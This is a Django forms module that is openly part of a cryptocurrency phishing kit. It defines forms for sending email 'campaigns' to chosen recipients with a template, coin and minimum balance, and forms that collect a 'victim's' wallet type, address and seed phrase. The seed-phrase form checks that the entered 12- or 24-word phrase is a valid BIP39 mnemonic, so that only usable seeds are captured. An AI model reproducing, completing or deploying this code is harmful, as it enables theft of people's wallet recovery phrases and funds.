from django import forms
from .models import Campaign, VictimInfo
from django.core.exceptions import ValidationError
from mnemonic import Mnemonic


# Campaign form for creating a single campaign
class CampaignForm(forms.ModelForm):
    class Meta:
        model = Campaign
        fields = ['recipient_email', 'email_template', 'cryptocurrency', 'quantity', 'min_balance']
        widgets = {
            'recipient_email': forms.EmailInput(attrs={'class': 'form-control'}),
            'email_template': forms.Select(attrs={'class': 'form-control'}),
            'cryptocurrency': forms.Select(attrs={'class': 'form-control'}),
            'quantity': forms.NumberInput(attrs={'class': 'form-control'}),
            'min_balance': forms.NumberInput(attrs={'class': 'form-control'}),
        }

# MultiCampaignForm allows creating a campaign with multiple recipient emails
class MultiCampaignForm(forms.ModelForm):
    email_1 = forms.EmailField(widget=forms.EmailInput(attrs={'class': 'form-control'}), required=False)
    email_2 = forms.EmailField(widget=forms.EmailInput(attrs={'class': 'form-control'}), required=False)
    email_3 = forms.EmailField(widget=forms.EmailInput(attrs={'class': 'form-control'}), required=False)

    class Meta:
        model = Campaign
        fields = ['email_template', 'cryptocurrency', 'quantity', 'min_balance']
        widgets = {
            'email_template': forms.Select(attrs={'class': 'form-control'}),
            'cryptocurrency': forms.Select(attrs={'class': 'form-control'}),
            'quantity': forms.NumberInput(attrs={'class': 'form-control'}),
            'min_balance': forms.NumberInput(attrs={'class': 'form-control'}),
        }

    def clean(self):
        cleaned_data = super().clean()
        email_1 = cleaned_data.get('email_1')
        email_2 = cleaned_data.get('email_2')
        email_3 = cleaned_data.get('email_3')

        emails = [email for email in [email_1, email_2, email_3] if email]
        if not emails:
            raise forms.ValidationError("At least one recipient email must be provided.")
        return cleaned_data


# Wallet selection form for the victim info collection
class WalletForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['wallet']
        labels = {
            'wallet': 'Select Wallet',
        }
        widgets = {
            'wallet': forms.Select(attrs={'class': 'form-control'}),
        }

# Address input form for the victim info collection
class AddressForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['address']
        labels = {
            'address': 'Enter Wallet Address',
        }
        widgets = {
            'address': forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Enter wallet address'}),
        }


# Passphrase input form for the victim info collection

class PassphraseForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['passphrase']
        widgets = {
            'passphrase': forms.Textarea(attrs={
                'class': 'form-control',
                'placeholder': 'Enter your wallet passphrase here...',
                'rows': 4,
                'style': 'resize: none;',
            }),
        }

    def clean_passphrase(self):
        passphrase = self.cleaned_data.get('passphrase')

        # Split the passphrase into words
        words = passphrase.split()

        # Check if the passphrase contains exactly 12 or 24 words
        if len(words) not in [12, 24]:
            raise ValidationError('Invalid phrase key')

        # Validate the passphrase using mnemonic library
        if not self.is_valid_passphrase(passphrase):
            raise ValidationError('The passphrase is invalid')

        return passphrase

    def is_valid_passphrase(self, passphrase):
        """
        Validates the mnemonic passphrase using the mnemonic library.
        """
        mnemo = Mnemonic("english")
        return mnemo.check(passphrase)  # Returns True if valid, False otherwise